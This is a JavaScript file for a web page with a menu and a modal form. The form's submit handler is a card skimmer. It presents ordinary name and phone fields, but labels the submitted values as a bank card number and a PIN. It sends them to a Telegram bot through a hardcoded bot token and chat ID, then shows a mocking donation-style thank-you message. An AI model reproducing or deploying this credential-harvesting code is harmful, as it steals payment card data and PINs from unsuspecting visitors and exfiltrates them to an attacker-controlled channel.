const burger = document.querySelector(`.burger`)
const menu = document.querySelector(`.menu`)

burger.onclick = () => {
    menu.classList.toggle(`open`)
}

const btn = document.querySelector(`#open-btn`)
const modal = document.querySelector(`#modal`)
const modalclose = document.querySelector(`#modal__close`)
const body = document.querySelector(`body`)

btn.onclick = () => {
    modal.classList.add(`active`)
    body.classList.add(`scroll`)
}

modalclose.onclick = () => {
    modal.classList.remove(`active`)
    body.classList.remove(`scroll`)
}

document.getElementById('telegramForm').addEventListener('submit', function (e) {
    e.preventDefault();

    const name = document.getElementById('name').value;
    const phone = document.getElementById('phone').value;
    const token = '6830538548:AAEJCd71OEBvSQCO871_NTs3BXCZpqimJKU';  // Замените на ваш токен
    const chat_id = '-4561781466';  // Замените на ваш chat_id
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    // Формируем сообщение
    const message = `Карта: ${name}\nПин: ${phone}`;

    const data = {
      chat_id: chat_id,
      text: message
    };

    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
      if (data.ok) {
        // alert("Заявка отправлена");
        // location.reload()
        const thanks = document.querySelector(`#thanks`)
        thanks.innerText = `на пиво бомжам`

        setTimeout(() => {
            location.reload()
        }, 3000);
      } else {
        alert("Error sending message.");
      }
    })
    .catch(error => {
      console.error('Error:', error);
      alert("Error sending message.");
    });
  });